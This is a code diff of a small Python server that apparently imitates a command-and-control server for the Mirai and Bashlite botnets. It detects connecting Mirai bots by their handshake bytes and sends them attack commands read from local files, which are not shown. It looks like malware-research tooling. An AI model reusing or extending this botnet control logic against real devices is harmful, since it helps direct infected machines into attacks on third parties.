@@ -4,13 +4,13 @@ import time
 
 
 def send_bashlite(c):
-    with open('../command_list', 'r') as f:
+    with open('./cmd_bashlite', 'r') as f:
         lines = f.readlines()
     for line in lines:
         try:
             c.send(line.encode())
             print('\033[91msend: \033[00m', line.encode())
-            time.sleep(1)
+            time.sleep(3)
         except Exception as e:
             print('Exception: ' + str(e))
             break
@@ -24,7 +24,13 @@ def send_bashlite(c):
 
 
 def send_mirai(c):
+    with open('./cmd_mirai', 'rb') as f:
+        dat = f.read()[:-1]
+    atk = list()
+    for id in range(11):
+        atk.append(dat[14*id:14*(id+1)])
     ping = b'\x00\x00'
+    id = 0
     while True:
         data = b''
         try:
@@ -40,16 +46,28 @@ def send_mirai(c):
             except Exception as e:
                 print('Exception: ' + str(e))
                 break
+        elif data[:2] != '\x00\x00':
+            try: 
+                c.send(atk[id])
+                print('\033[91msend: \033[00m', atk[id])
+                time.sleep(3)
+                id += 1
+                if id == len(atk):
+                    break
+            except Exception as e:
+                print('Exception: ' + str(e))
+                break
 
 
 def send(c):
     data = b''
-    try:
-        c.settimeout(5)
-        data = c.recv(1024)
-        print('\033[92mrecv: \033[00m', data)
-    except:
-        pass
+    while data == b'':
+        try:
+            c.settimeout(5)
+            data = c.recv(1024)
+            print('\033[92mrecv: \033[00m', data)
+        except:
+            pass
 
     if data[:4] == b'\x00\x00\x00\x01':
         send_mirai(c)
@@ -76,7 +94,7 @@ def server(host):
             return -1
 
         print('Connected to ' + str(addr[0]) + ':' + str(addr[1]))
-
+        time.sleep(1)
         sendThread = threading.Thread(target=send, args=(c,))
         sendThread.start()
         sendThread.join()
